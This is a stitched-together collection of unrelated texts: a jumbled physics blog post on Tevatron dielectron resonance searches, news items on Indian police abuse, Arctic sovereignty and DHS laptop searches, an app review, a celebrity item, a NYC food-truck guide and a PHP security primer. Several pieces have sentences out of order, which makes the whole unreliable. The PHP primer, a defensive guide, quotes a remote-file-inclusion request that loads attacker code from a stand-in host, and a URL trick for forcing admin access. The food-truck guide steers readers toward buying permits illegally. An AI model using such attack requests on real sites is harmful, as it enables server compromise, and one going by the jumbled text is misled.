He is proposing the creation of a CO2 budget for every person on the planet , regardless whether they live in Berlin or Beijing .
" The search for high mass resonances decaying to di-electrons , conducted by CDF , using 2.5 / fb of data , showed the largest discrepancy with the expected background at m_ee = 240 GeV .
Figure 3 [ the one shown above ] shows our results for the region of the excess reported by CDF .
Good agreement in that range between the data and the expected total background is observed . "
the experimental resolution on the dielectron mass is ( slightly ) different in the two apparata , so it is not entirely appropriate to display events from the two experiments with the same binning ;
the angular acceptance is different , as already mentioned ; other details also make the two datasets not strictly comparable ( for instance , DZERO does not explicitly require the two electrons to have opposite charge ; I am not sure , but I suspect that CDF enforces the requirement - I will find out and update this here ) ;
backgrounds are different , have different systematics , are normalized with different prescriptions ;
Readers familiar with this blog know that I am a die - hard skeptic on the issue of physics beyond the Standard Model .
However , today I am wearing my fluctuation - enthusiast hat , and I will be trying to argue in favor of the possible signal of new physics that is coming out of the Tevatron data .
Please do not get confused : everything is still in order .
Maybe .
The notitia criminis is a new search for resonances in the dielectron mass spectrum , recently published by the DZERO collaboration .
The results of the DZERO analysis had a roller - coaster effect on me today .
So , in the absence of other sources of excitements in the peaceful island from which I am currently blogging , let me try to convey the same sort of high I got from pondering on the new result - twice .
Before going to the DZERO search , however , it is necessary to summarize an older result .
A search for resonances in the dielectron mass spectrum was carried out by CDF in 2.5 inverse femtobarns of proton - antiproton collisions last year .
( If the word " femtobarn " has you wondering whether you belong here , the answer is still yes : this post is for everybody - I do not intend to discuss much physics here .
Inverse femtobarns are a perverse measurement unit to count collisions , and 2.5 of them amount to about two hundred trillion collisions .
As for " dielectrons " , it is a nickname for " electron - positron pairs " .
As for " resonances " , well ...
Resonances are particles which exist for vanishingly short instants of time .
Now read on . )
Such a search is one of the few things that are mandatory at a hadron collider experiment : when you select events with two high - energy electrons coming out of a proton - antiproton collision , you know you are looking for the crème de la crème of your data .
A new particle heavier than the Z boson but otherwise behaving exactly like it would be very easy to spot in its electron - positron decay , because the signature is extremely clean : almost no physical process can fake a bump in the distribution , and - what is more important - all the nasty quantum chromodynamical processes involving quarks and gluons are automatically kicked out of the window , because they just cannot produce events with two electrons and nothing else around .
Backgrounds are coming from weak interactions , and we know how to compute those pretty well .
So what did CDF find ?
They found something puzzling .
Overall the mass distribution was very well modeled as the sum of the main contributing processes : essentially , just the process called " Drell - Yan " , whereby a quark - antiquark pair annihilates into an electroweak mediator ( a photon or a Z ) , which subsequently materialize the dielectron pair .
However , a nagging excess was found for dielectron masses around 240 GeV .
The tentative signal is shown in the plot on the right : a fluctuation of computed backgrounds was estimated to correspond to a statistical effect of 3.8 standard deviations - in more scientific terms , a pretty darn rare occurrence !
A careful study taking into account the fact that the signal could have appeared anywhere in the studied spectrum ( a fact which decreases the rarity of the observation of a fluctuation happening somewhere ) brought CDF to , thus slightly less than a " 3 - sigma evidence " , but still quite intriguing .
CDF has not yet updated this result by adding more of its data to the dielectron mass distribution this year , despite the fact that by now they should be sitting on twice as many events as those published .
Whether you want to interpret this as a sign that the fluctuation is going away in the new data or whether instead you figure that something is cooking in CDF 's kitchen , is up to you .
Meanwhile , CDF 's cousin did not sit and watch .
The competing experiment has now produced their own search for dielectron resonances using 3.6 inverse femtobarns of Run II data - over 40 % more statistics than last year 's CDF result .
Unfortunately , while CDF considers both central and forward electrons in its study , DZERO only looks at pairs of electrons both landed in the central region of the detector : this reduces the acceptance significantly .
Because of that , do not be surprised by seeing the DZERO histogram below being half as populated as the one of CDF shown above .
You can see in the distribution above that DZERO 's dielectron sample is just as clean as the one produced by CDF ( backgrounds other than the Drell - Yan process are represented by the black and green chickenshit lying at the bottom ) .
The mass spectrum shown is the part which contains the region where CDF saw an excess last year ( in fact , DZERO produced the graph explicitly to check the CDF signal ) .
No big signal at 240 GeV is apparent , although some upward fluctuation is visible there .
In their paper , DZERO address the issue : Sure , but ...
How about the fact that at 240 GeV DZERO predicts they see 12.7 events ( a number I desume from the plot ) while they observe 17 ?
The paper does not mention this , but the data is there to tell .
Now , while it is of course true that 17 is compatible with 12.7 within statistics ( and I am not even getting into a discussion on what is the uncertainty on that background prediction ) , it still is higher by 4.3 counts .
Now , let us crunch some numbers in a quick and dirty way , just for the sake of it .
CDF has a smaller luminosity - 2.5 against 3.6 inverse femtobarns - but a much larger acceptance thanks to forward electrons ; however , we are not enabled , by the information in the released papers , to estimate correctly the ratios of efficiencies .
What we can do is read off the effective cross section for Z production at the peak from the CDF and DZERO plots .
One can see about 100,000 Z events in the 80 - 100 GeV region of the CDF plot , and about half as many are present in the same region of the DZERO data .
Therefore , if a new Z - like signal produces 22.5 events of excess in the 240 - 250 GeV bin of the CDF mass distribution , as shown in the first figure shown above , we expect an excess of about 14 events above background in the DZERO plot at the same mass .
The " excess " of 4.3 events in the 240 - 250 GeV bin of the DZERO mass spectrum is thus rather underwhelming ; however , imagine that a tentative new signal were predicted to produce 16 events in CDF and 8 in DZERO : a fluctuation of those counts to 22.5 and 4.3 would then look not at all that unlikely ...
Also , consider a subtlety here : if a new signal produced more forward electrons than the Z decay ( such could be the case , for instance , if the resonance had different spin and decay properties ) , it would then appear much more strongly in the CDF data than in DZERO data , because DZERO would cut it out more with its central - electron requirement than what it does with the Z.
All in all , we can not say much more about those numbers .
What we can do , however , is to take the data and predicted background from the two experiments , and combine them in a single histogram : for once , they plot their data with the same binning !
The result of this exercise , which - I should stress it here - is my own concoction and is not approved Tevatron material , is shown below .
" Duh , " I can almost hear you say , " anybody can add two numbers , so what is the reason of such a pedantic remark ? " .
Well , Italians would say " I know my chicken " : there are people in my experiment who even managed to make a fuss of my publishing here , a couple of years ago , a zoomed - in version of an approved plot ( details are always obscene , I agree ) .
And I do not want to upset anybody .
The plot above is therefore " just for fun " .
Among the caveats of adding " two and two " in a carefree fashion I could list : and so on .
But let us not be troubled by such details , since this article is not a rigorous analysis but a speculative piece .
Let us instead get back to what my figure shows : you see that the addition of DZERO data on top of CDF ones sort of " smoothens " the distribution , leaving the 240 GeV point sticking out head and shoulders from the slowly falling background ( smart - assed readers might also point out that a similar fluke , although a downward one , is present at 200 GeV , but let me go on ) .
Is the significance of the 240 - GeV bin larger now that we have increased the effective statistics by about 50 % thanks to DZERO ?
Well , yes and no .
Again , remember I am eyeballing here : CDF did a careful assessment of the significance of the excess in the region around 240 GeV , while here I just pick one single bin and compare with the claimed background .
In the CDF plot we had 50 events at 240 GeV , on top of 27.5 expected from background sources .
Neglecting everything else ( neighboring bins , background uncertainty , " look elsewhere " effect ) , and using not more paper for the computation than the back of an envelope , one could say this was at most a ( 50-27.5 ) / sqrt( 50 ) = 3.18 standard deviation effect .
With the addition of the small excess seen in that bin by DZERO we instead now have ( 67-40.2 ) / sqrt(67 ) =3.27 standard deviations .
Apparently , the effect has not gone away , as DZERO seemed to imply between the lines !
So , is there a new resonance at 240 GeV , decaying into electron - positron pairs ?
We do not know yet , but it is pretty clear that if it is anything real it is a rather elusive particle : among the half - a- dozen different theoretical models that predict the existence of a heavier partner of the Z boson ( so - called Z- prime boson ) , all of them have been ruled out for masses below 600 to 800 GeV , as the DZERO plot shown below best illustrates .
In the figure , you can see in different colors the expected rate of resonance events as a function of the resonance mass , for different Z ' models .
The green curve shows instead the upper limit extracted by the DZERO mass spectrum : as long as the limit is staying below the expected theoretical rates ( which happens anywhere below 700 GeV for all models ) , the corresponding resonance masses are excluded .
One last note has to be made on the possible existence of a Z ' resonance : it would be really , really strange that such a particle decayed to electrons and failed to decay to muon pairs too !
Indeed , CDF did search for resonances in the dimuon invariant mass distribution last year , and they published a search which showed no hint of an excess anywhere in the spectrum .
Check it out in the figure below , which displays the inverse of the invariant mass for muon pairs ( a perversion justified by the fact that on this variable the resolution is constant across the horizontal axis , so the bin widths can be kept equal ) :
A resonance with a 240 GeV mass would show up as an excess at about 4 / TeV in the plot - just above the fourth tick mark on the x axis - , but obviously the sum of all known processes and the observed counts match very well there , and everywhere else in the spectrum .
Now , while this does not a priori kill the dielectron excess , it does cast a very serious doubt on its nature ( or , for skeptics like me , it confirms expectations ) : lepton universality is at least as strong a dogma as the non-existence of heavy partners of the Z , so suggesting the existence of a heavy partner of the Z which also violated lepton universality , by choosing to decay only to electrons and never to muons , we would have a double - dare speculation .
Too much for me , so I will archive the above high bin for what it is - a fluctuation .
Just as I thought my excitement for the new DZERO paper was placated by the exercise of adding up the bins of the two Tevatron experiments in the 240 GeV region , I noticed that DZERO spends quite some space at the end of their paper to discuss their highest - energy event , a beautiful dielectron explosion , whose estimated mass is 760 GeV .
Below you can see a two - dimensional histogram showing the energy deposits due to the two electrons in the DZERO calorimeter , which for display purposes has been " rolled off " its azimuthal dimension .
The height of each bar is proportional to the energy deposited there by particles produced in the collision .
760 GeV is only an indicative value : the mass resolution of such high - energy electron pairs is of the order of 25 GeV , so this could quite likely be a 700 GeV or a 800 GeV particle decay , if it was a particle decay .
This got me thinking .
CDF has a few outliers at high mass in its dielectron mass spectrum too .
Let me show the full mass distribution published last year by CDF below :
There are indeed two events with a mass above 700 GeV , in a region where backgrounds only predict at most half an event !
What is more striking is that both CDF and DZERO have no events above 600 GeV except those three : for a full 100 - GeV range of mass above 600 GeV backgrounds die out , and neither experiment sees anything ; then , between 700 and 760 GeV , three events , and then nothing more again ( see the DZERO high - mass distribution on the right ) .
Is this not suggestive ?
The 700 - ish GeV " signal " cannot be easily dismissed by observing that the dimuon search of CDF saw nothing in that region , because dimuons were sought only in the central region of the detector , and with a smaller luminosity ( 2.3 inverse femtobarns ) : two events in the dielectron sample could well go hand in hand with zero events in the smaller dimuon sample , without the latter killing the former .
All in all , I value this 700 - GeV clustering as even more interesting than the 240 GeV " 0.6 % " effect produced last year by CDF .
I hope you have enjoyed this rather incorrect and scandalistic summary of the ongoing searches for Z ' bosons going on at the Tevatron collider .
Of course , when one searches for a bump in a mass distribution , things are very likely to get exciting at some point .
Some experience in high - energy physics , however , dampens the enthusiasm for the elusive fluctuations that appear , and then disappear , here or there in the spectrum .
I think it is interesting to note , at the end of this rather long article , that if indeed a Z ' boson of some kind exists and has a mass in the 700 GeV region , the Tevatron is risking big , for it could just fall short of catching it by the tail : such a Z ' signal is in fact one of the sweetest dreams of the CMS and ATLAS experiments at the LHC , since it would show up almost instantaneously ( well , sort of ) in their data , as soon as the accelerator turned on .
In that case , the Tevatron would be left biting the dust , and the tradition in high - energy physics that bosons are discovered in Europe would keep going strong !
UTTAR PRADESH , India ( CNN ) --
An Indian police office grabs two fists - full of a suspect 's hair ; twists and then lifts until the suspect 's feet dangle off ground .
The suspect : A 6 - year - old girl accused of stealing 280 rupees or about 6 dollars .
The incident resulted in one officer being fired , another suspended .
Charges against the girl were dropped .
It was all caught on tape in February of this year .
Harcharand Singh and his wife .
Mr Singh says their son , accused of thief , died in police custody .
Two years earlier in another Indian state another caught on tape moment .
A police officer watches as a crowd beats an accused thief .
Then the policeman binds the suspect and ends up dragging him behind a motorcycle leaving large raw patches of skin on the suspect 's body .
The accused survived the thrashing .
Two officers were fired in the incident but were later reinstated by a panel that blamed the crowd .
Brutal police tactics are all too common in India according to the latest report by Human Rights Watch in India .
Naureen Shah with Human Rights
Watch says the report is based on interviews with 80 police , 60 alleged victims and other experts .
" The police are taking the law into their own hands . "
Shah says .
" They are acting as a vigilante force and they 're saying this is a bad guy instead of building a case against him we 're going to kill him , we 're going to take these harsh measure cause it has to get done . "
" Police administration are meant to protect , but they are becoming predators . "
Harcharand Singh says .
He is the father of a suspect he says died in police custody .
Singh and his wife are dirt poor and partially blind .
They sit on a bed with tears in their eyes as they speak about losing their son Pradeep .
Do n't Miss Police accused of torture
They say police hauled Pradeep away one night accusing him of being involved in a car theft and shooting .
Days later they say he died in police custody .
Police refused to comment on the case or the report .
" We are scared . " Mother Ram Vati Singh says through tears .
" What else can we do ?
We have no money so that we can leave or put up a fight with the police . "
The case was one of dozens highlighted in the Human Rights Watch report used as yet another example of what they say is out of control police behavior .
Watch a report on abuse cases »
But the report also revealed something else .
The terrible conditions police work and live in .
Many live in police stations for days even months at a time unable to go home to see their families because they are expected to be on call 24 hours a day 7 days a week .
Some work and live in tents in scorching temperatures .
Their bathroom facilities are often wretched .
Their cooking facilities sometimes made up of bricks with fire wood .
The number of cases and pressure to solve them is intense .
Police also say they are short staffed .
One police official told us in his jurisdiction there are 70 police for a population of 250 - thousand people , something CNN is unable to independently confirm .
There are no computers for reports so police officers fill everything out by hand .
Some departments even run out of paper to write the reports according to the Human Rights Watch report .
Former Delhi Police Commissioner Ved Marwah says the conditions are dire .
" The policemen are treated very inhumanly and that 's why he gets desensitized and brutalized by his living and working conditions an by his interaction with the common citizen and with his superiors and that desensitization is reflected in the way an average policeman deals with the public at large . "
Marwah says .
Marwah says there is also interference from politicians in police investigations .
" Politics plays a very negative role . "
He says .
Today 's politicians , every politician there are good politicians and bad politicians , every politician looks upon it as a profession and he's there to make a quick buck and when he gets that control over the police , he uses an misuses not to ensure that the police enforces the rule of law , but to see that the police commits or does n't commit a particular action to help him in his personal ends . "
Efforts to reform police activities were ordered by India 's supreme court three years ago .
Marwah and Human Rights
Watch both agree the ruling was never implemented .
However the current government is promising changes .
But Marwah says until it really happens , the abuses by and to police will continue unabated .
" Because ultimately the police , unlike the army , is absolutely under political control .
He says " If those who control the police have no will to reform it , then nothing is going to happen . "

When Ustream ‘s video webcasting app hit the market on Friday , my first thought was , “ I wonder how it compares to Qik ? ”
Once the rough edges are polished off , Ustream ’s app will beat Qik ’s in some areas , but Qik has the leg up in others .
Both apps do a good job handling their basic function : capturing video and audio and broadcasting live to the web .
It ’s both a “ wow factor ” function ( that our friends with iPhones ca n’t currently replicate ) and something that ’s truly useful .
Ustream boasts that it does a better job of handling latency , so I put it to the test .
It seemed to use a bit larger buffer–it took a couple seconds longer for the webcast to begin online than Qik–and at the end of a four minute video , Ustream ’s webcast was running only 4 seconds behind real time .
Running the same four minute test with Qik , the webcast started a couple seconds more quickly , and latency was up to seven seconds by the end .
Is that a big difference ?
I do n’t think so .
While Ustream ’s claims are true , it ’s not going to be meaningful with short webcasts .
But it might be an important differentiator if you plan to do longer pieces .
Other Features
Ustream boasts a load of controls , most available while webcasting .
You can :
Record locally ( to SD ) when you do n’t have a data connection ( and then upload later ) .
Edit titles / tags for your videos .
Geotag your videos .
Hit a button to tweet a link to your webcast .
View chat and hashtagged tweets about your webcast on your phone in real time .
Mute audio .
Conduct polls .
Announce the poll via audio , then hit the poll button .
Those watching can vote yes or no , and the results show up on your phone as they come in .
Specify high or low quality ( of the webcast )
Specify high or low resolution ( of the in - app viewfinder )
Overtake another stream .
For example , say you have a Ustream channel that shows a webcam in your office .
By specifying that channel on your phone , you can interrupt the stream with your “ on- location ” webcast .
Qik has a couple features Ustream does not , but has fewer overall :
Record locally ( to SD ) when you do n’t have a data connection ( and then upload later ) .
Edit titles / tags for your videos .
Geotag your videos .
Hit a button to share a link to your webcast via Twitter , Facebook , YouTube , or with individual contacts via email or SMS .
Qik clearly wins on sharing features .
Hit a button to toggle whether your webcast is public or private .
Basic video editing .
After you record locally , you can use an easy slider to trim unwanted footage from the beginning and / or end of the video .
User Interface
As I mentioned , you have a lot of controls at your fingertips with Ustream .
On the other hand , this leads to a fairly cluttered UI .
With Qik , you have fewer options while recording , but you also have a larger viewfinder , a more easily accessible record button and a generally cleaner UI .
The Problem with Ustream
Unfortunately , some technical issues make Ustream an unreliable choice at the moment .
I ran into the following while testing the app :
While webcasting , Ustream apparently hogs resources , causing other processes ( e.g. widgets ) to hang .
This throws repeated dialogues asking whether you want to force close or wait for the process .
This is the biggest issue and occurred several times while webcasting .
While the webcasts were uninterrupted , it takes your attention away from what you are trying to record .
An error upon opening : “ Cannot access camera .
Please reboot your phone . ”
The app then closed .
This happened a couple of times ( and was , in fact , resolved by rebooting ) .
Once or twice , the app crashed while logging in , and quit back to my home screen .
This last issue made me laugh .
Ustream auto - tweeted a link to one of my webcasts with this text : “ Im broadcasting , from my iPhone , live on Android phone . ”
I tested version 0.8.1 of the app on a rooted G1 running Cyanogen ’s latest stable build , 4.0.4 .
It ’s promising that the developers already pushed out one update ( from 0.8 to 0.8.1 ) , so hopefully we ’ll see these rough edges polished off soon .
The Verdict Until Ustream addresses those technical issues , I ca n’t recommend it as a reliable option .
But assuming the app will be fixed soon , Android users will have two good choices for video webcasting .
Ustream offers lower latency and more granular controls while Qik offers video trimming , better sharing options and a cleaner user interface .
Both apps are available for free in the Android Market .

This story has gotten so far that I ’m even starting to feel bad for Kanye West .
Not only have a bunch of celebrities dogged him out for his rude outburst at the VMAs during Taylor Swift ’s acceptance of the Best Female Video award , but now the president of the United States has chimed in , and he apparently thinks Kanye West is a “ jackass . ”
According to a tweet from ABC reporter Terry Moran :
That tweet has since been deleted , but not before Politico.com caught it .
An ABC spokesperson explained to Politico that that comment was from an off - the - record portion of a CNBC interview , and while reporting on the interview , ABC News employees tweeted the comment before the “ editoral process ” was complete .
If Kanye West was n’t smarting before ( which he probably was , considering that he ’s apologized twice since the incident ) he ’s got to be now ; getting a diss from Kelly Clarkson is a lot different than getting one from our coolest president .
Update :

A number of countries have competing claims for the Arctic
Canada is launching a series of military exercises in the Arctic far - north region of the country .
The so - called sovereignty operation is designed to show a visible presence in the resource - rich area , amid competing claims among other nations .
Canadian Prime Minister Stephen Harper is expected to join in some of the exercises later in the week .
Asserting Canadian sovereignty in the Arctic has been a priority for Mr Harper 's conservative government .
' Show of strength '
Operation Nanook will see the Canadian Armed Forces involved in sea , land and airforce operations in the country 's eastern Arctic territory .
Mr Harper is expected to join the operation midweek , when he will board both a navy frigate and a submarine during a warfare exercise .
The region was once considered barren , but a number of countries with competing claims - including Denmark and Russia - have been carefully mapping the area around the North Pole , thought to be rich in minerals and natural resources .
In a symbolic gesture that won attention around the world in 2007 , Russian explorers planted their country 's flag on the seabed below the North Pole .
Canada is also concerned by the melting of ice each year through the fabled Northwest Passage , blamed by scientists on global warming .
The United States government has said that it does not recognise exclusive Canadian rights to the waterway , that could be a link between the Atlantic and Pacific oceans .
Some military analysts say that despite this week 's show of strength , Canada does not have the resources to protect its vast Arctic territory full time .
There have been recent signs of closer co-operation in the region between Canada and Denmark .

In the two years since New York published an extensive guide called “ Cartography , ” the city ’s enthusiasm for street food has only increased .
Trucks and carts , once the purview of recent immigrants , are now alternative gigs for displaced recession victims or starter dream jobs for anyone who ever wanted to own a restaurant but could n’t make the numbers crunch .
Before you fire her up , however , there are a few things you should know about operating a food truck , from getting a license to making sure you do n’t get knifed by the halal guy next to whom you just parked ( spoiler :
You ’re going to get knifed by the halal guy ) .
Startup / Operating Costs :
Though trucks are a small business , they still require a significant investment .
Costs include the truck , permit acquisition , supplies , security , insurance , and truck storage , among other things .
Some of the costs are obvious , and some are not .
Truck parking , for example , may not seem like an expense , but the Department of Health requires all trucks to be stored and maintained at a food - truck commissary , where you ’ll pay rent for things like access to clean water and refrigeration .
The less you need your truck to do , the cheaper it is .
Treats
Truck , which bakes its goods off - site , was born in 2007 with $ 80,000 in capital .
According to one business plan we ’ve seen ( but never came to fruition ) , a pizza truck seeking $ 300,000 in start - up capital expected to make money right away .
High volume and excellent margins can be a reality for trucks .
For this pizza concept the profit margin was estimated to be over 50 percent , as compared to a good restaurant , where the margins are n’t greater than 10 percent , if you ’re lucky .
Permits : The Rules of the City of New York , the abstruse , hulking set of guidelines that regulate activities ranging from operating a street cart to carrying a handgun , stipulates that two permits are required : a Mobile Food Vendor License for you and a Mobile Food Vending Unit Permit for your truck .
The former is a matter of paperwork and a few classes .
The latter is not , as the city stopped issuing them ten years ago , according to a representative at the Department of Consumer Affairs , and there has been a cap of 3,100 licenses since 1979 ( 5,100 , if you count fruit and vegetable carts , too ; a bill has been introduced to raise the cap to 25,000 ) .
The permits are distributed via lotteries .
Veterans are eligible for certain exceptions and receive priority status in the permit lotteries , which are held periodically , according to Elliot Marcus , associate commissioner for the Bureau of Food Safety and Community Sanitation .
And the rep over at the Department of Consumer Affairs did tell us that you can get an exception from the Parks Department or a hospital to operate on their property .
Indeed , the process is extremely complex and loopholed , and any exception will increase your start - up costs significantly .
The Times ran a story on this recently , as did the Village Voice .
Also , “ some people are operating carts legally and some are n’t , ” hinted our Consumer Affairs operator .
The upshot : Your only real option for getting a permit is the black market , where you can either buy a permit illegally , mostly in Queens , for between $ 5,000 and $ 20,000 , or partner with an existing license holder , for cash and a portion of profits , say 10 percent of sales .
If you ’re interested in pursuing one of these options , head to a food - truck commissary ( we ’ll get to those in just a moment ) or ask your favorite truck operator , who might have heard about an available permit via word of mouth .
( Note that the NYPD arrested six people last month on charges of fraud counts related to illegal food - vending permits , so brokers — and permits — are harder to find . )
One important footnote here is that while the brokering of permits is highly illegal , once you ’ve secured the permit , the Department of Health does very little at present to police these rogue permits .
And , Marcus concedes , there are many loopholes .
For example , “ There ’s absolutely no requirement that a permit holder works the cart .
I could have a permit and hire people [ to work ] seven days a week and monitor what they do , ” he says .
“ And that would be completely legal ..
In the grand scheme of things , it ’s not the biggest health priority for us . ”
The Truck :
This is the relatively easy part , as food trucks are readily available online .
Budget $ 75,000 to $ 100,000 for the acquisition and retrofitting of the truck .
( Kenny Lao bought his Rickshaw Dumpling Truck on the “ Commercial Trucks ” section of eBay . )
To ensure that your rig passes Health Department approval , Sean Baskinski of the Urban Justice Center ’s Street Vendor Project recommends Workman Cycles in Ozone Park ( 800 - BUY - CART ) for the job .
The garage does enough truck work to be well versed and up - to - date with DOH code .
( There ’s also Steve ’s Sheet Metal in Woodside , but ’ Steve ’ just got arrested for permitting fraud .
True . )
Location , Location , Loc … hey , who slashed my tires ? :
City codes make certain streets and areas off - limits to food vendors , so consult the list supplied by the Street Vendor Project when you ’re picking a spot .
There is an unspoken law of the street that says seniority plays — and that if you try to park on a corner or stretch that has long been occupied by someone else , you will pay a hefty price .
We asked Kenny Lao why he does n’t just set up shop in the meatpacking district , which on a weekend night would seem as high - volume as locations come , and he indicated that the reason was in part the threat of violence from existing vendors .
Still feeling the Churros y Chalupas truck , champ ?
Most of the big restaurateurs in the city have passed on trucks because of the complications around permits and location .
( Indeed , the Street Vendor Project is now actually offering a class on it . )
But , do n’t let that scare you : good luck .
Let us know when you fire up the Twitter .

Earlier this week , the U.S. Department of Homeland Security made it clear that border crossing officials could continue to search any device that can store electronic media without any suspicion of wrongdoing .
Although the revised policy ensures searches will be completed in a " timely manner " ( up to 30 days ) and that travelers will stay informed about the search 's progress , travelers crossing the border might want to consider a few things .
Officials can still seize any device ( including MP3 players or flash drives ) and look at any file on it ( including Internet browsing history ) without giving any reason .
The Association of Corporate Travel Executives ( ACTE ) believes agents take laptops , make an image of the hard drive and then return the laptop to its owner in the mail .
Any copied files could be stored " indefinitely . "
( Imagine what the Border Patrol 's iTunes Library will look like after " indefinitely " storing DRM - free music from several dozen searches . )
The ACLU is also taking a dim view of the DHS policy , and is challenging it in court .
For the moment , though , it 's smart to be prepared .
Although the DHS 's exact procedures are unspecified , the department 's new policy states when travelers are subject to a search , agents will provide them " with clear and concise material informing them of the reasons for the search , how their data may be used and detailed information about their constitutional and statutory rights . "
If you 're traveling for business and have important files you 'll need on your trip , it would n't hurt to save them to multiple locations so you are n't left without them .
Better yet , use Google Docs or another Internet - based storage system to ensure your private information stays private .
In the case of a search , ACTE recommends you inform the agent that you have sensitive information on your computer .
Try to get your concern noted in writing ; at least , be sure to express it verbally .
ACTE says this will help you retain more legal rights for registering your concern .
Although these searches do n't occur very often ( the Border Patrol looked at around 1000 laptops and searched 46 laptops in - depth in the past ten months ) the best bet for travelers concerned about privacy is to leave unneeded electronic storage behind .
Defining PHP Security and It ’s uses
PHP is the most popular web programming languages in use today due in large part to the fact that it ’s a highly flexible syntax that can perform many functions while working flawlessly in conjunction with html – Plus it ’s relatively easy to learn for beginners , yet it ’s powerful enough for advanced users as well .
It also works exceptionally well with open source tools , such as the Apache web server and MySQL database .
In other words , its versatility is unsurpassed when compared to other scripting languages , making it the language of choice for many programmers .
Though many programmers and developers may be implementing PHP in their websites , the issue of PHP security is often overlooked when building a site .
Insecure coding is rather common in PHP due to the fact that it ’s such a forgiving language that will often “ work ” even when there are a few loose ends in the coding .
These “ loose ends ” are what hackers are looking for , and in PHP , they ’re not that hard to find .
The key is for you to find them first , and to leverage PHP ’s unique features to minimize your security vulnerability .
PHP Security involves minimizing programming errors as much as possible , and putting proper code in place to protect against possible vulnerabilities – Often times this means putting 2 - 3 “ layers ” of protection in place to guard sensitive data against hackers that could otherwise cause a catastrophic result if compromised .
Developers call this principle of redundant safeguarding Defense in Depth , and this concept has been proven over the years to be an extremely effective defense against malicious attacks .
Types of Attacks
There are various types of attacks that PHP is particularly vulnerable to , and any website that sends or receives information is at risk of an attack – ranging from an annoyance to catastrophic – so it ’s important to put the proper security in place to minimize the risk .
The two main types of attacks are human attacks and automated attacks – Both of which can potentially devastate a website .
The most common type of human attacks are little more than annoyances and are common at file storage sites and forums , such as abusing file storage policy , defamation , lobbying at sites such Amazon or Yahoo Answers , and other similar abuse that does n’t necessarily involve manipulation of your website ’s source code .
Humans can also find security holes that allow them to access source code and use it maliciously .
This can potentially cause substantial damage to your website , so this is the type of human attack you should focus your efforts on .
Automated attacks are particularly dangerous because of their efficiency in using the power of automated scripts to wreak havoc on your website in a number of different ways .
These attacks may slow down your site , access the error logs , manipulate the source code , or compromise sensitive information – The possibilities are seemingly endless .
The most common , and notorious , type of automated attack are viruses and worm , which are slightly different in nature but are similar in the way that they can potentially harm a website .
The goal of PHP security is to minimize , and ultimately eliminate , the potential for both human and automated attacks by putting into place strategic lines of defense to eliminate access to your site by unverified users .
The way you go about doing this is to target the most common types of PHP security breaches first , so that you make your website airtight against malicious attacks .
So what are the most common types of PHP security breaches ?
Most Common PHP Security Vulnerabilities
Experienced hackers know the most common types of security holes to look for in PHP , so it ’s important to address these issues first .
It does n’t matter whether you ’re a beginner or expert PHP programmer , every programmer makes mistakes now and then , and hackers will find it if you do n’t first .
1. Register_Globals
Register_Globals makes writing PHP applications simple and convenient for the developer , but it also poses a potential security risk .
This setting is located in PHP ’s configuration file , which is php.ini , and it can be either turned on or off .
When turned on , it allows unverified users to inject variables into an application to gain administrative access to your website .
Most , if not all , PHP security experts recommend turning register_globals off .
For example take a look at the code snippet below .
A user could append the end of a page ’s url with ?
admin=1 to basically force entry to administrative areas that would normally require a password .
With register_globals turned off , this type of forced entry is n’t possible .
The good news is that PHP 4.2.0 has register_globals turned off as its default setting , and PHP 6.0.0 has actually removed the feature .
While some developers frown upon this move because register_globals off makes programming in PHP slightly more time - consuming , but in terms of PHP security it ’s a crucial step in the right direction .
So instead of relying on register_globals , you should instead go through PHP Predefined Variables , such as $ _REQUEST .
To further tighten security , you should also specify by using : $ _ENV , $ _GET , $ _POST , $ _COOKIE , or $ _SERVER instead using the more general $ _REQUEST .
2. Error Reporting
Error reporting is a great tool for diagnosing bugs and allowing you to fix them quicker and easier , but it also poses a potential security threat .
The problem occurs when the error is visible to others on - screen , because it reveals possible security holes in your source code that a hacker can easily take advantage of .
If display_errors is not turned off , or have a value of “ 0 ” , the output will appear on the end user ’s browser – Not good for security !
You do , however , want to set log_errors to on , and then indicate the exact location of the log with error_log .
Take a look at the table below from PHPFreaks.com , which points out the recommended settings for both production and development instances of PHP web applications .
3. Cross -Site Scripting ( XSS )
Cross - site scripting , or XSS , is a way for hackers to gather your website ’s user data by using malicious markup or JavaScript code to trick a user , or their browser , to follow a bad link or present their login details to a fake login screen that instead of logging them in , steals their personal information .
The best way to defend against XSS is to disable JavaScript and images while surfing the web , but we all know that ’s nearly impossible with so many websites using JavaScript ’s rich application environment these days .
To defend against XSS attacks , you need to be proactive – Do n’t wait until your website has already been exploited .
For instance , PHP applications that use form submission , or POST requests , are much less vulnerable than GET requests .
So it ’s very important that you spell out which variables and actions will be allowed as GET values , and also which ones must come via POST values .
In a nutshell , defending against XSS involves controlling the user input at your site and making sure that it goes through a filtering process to ensure that it ’s void of malicious code .
An example of filtering user input can be found in the snippet of code below that was taken from Pro PHP Security by Chris Snyder and Michael Southwell .
This relatively straightforward piece of code works by preventing html and JavaScript from being embedded in the input , which results in a completely safe version of the input .
This is especially useful for comment sections of a blog , forums and other web applications that receive user input .
Also useful for protecting against XSS is a useful PHP function called htmlentities ( ) .
This simple function works by converting all characters in html to their corresponding entities , such as “
4. Remote File Inclusion ( RFI )
This type of attack is relatively unknown amongst developers , which makes it an especially damaging threat to PHP security .
Remote file inclusion , or RFI , involves an attack from a remote location that exploits a vulnerable PHP application and injects malicious code for the purpose of spamming or even gaining access to the root folder of the server .
An unverified user gaining access to any server can wreak major havoc on a website in many different ways , including abusing personal information stored in databases .
A great example of an RFI attack can be found atPHPFreaks.com .
Here ’s an exerpt from that page :
Imagine that at http://example.com/malice.php a file exists and our script is located at http://site.com/index.php.
The attacker will do this request : http://site.com/index.php?page=http://example.com/malice.
This file will get executed when it is included and it will a write a new file to the disk .
The best way to secure your site from RFI attacks is through php.ini directives – Specifically , the allow_url_fopen and the allow_url_include directives .
The allow_url_fopen directive is set to on by default , and the allow_url_include is set to off .
These two simple directives will adequately protect your site from RFI attacks .
Other PHP Security Tools
While the most effective way to secure PHP web application is through accurate coding and vigilante monitoring of your site , there are other helpful tools out there that can help to quickly and easily point out possible vulnerabilities in your PHP coding .
Here are three useful tools that can be beneficial to PHP developers :
– PhpSecInfo
This useful tool reports security information in the PHP environment , and best of all , it offers suggestions for improving the errors .
It ’s available for download under the “ New BSD ” license , and the PhpSecInfo project is always looking for more PHP developers to help improve this tool .
Download PhpSecInfo Here .
– PHP Security Scanner
This is a tool used to scan PHP code for vulnerabilities , and it can be used to scan any directory .
PHP Security Scanner features a useful UI for better visualization of potential problems , and it supports basic wild card search functionality for filtering directories or files that are to be searched .

Dan Antopolski with his award for the funniest joke of the Fringe
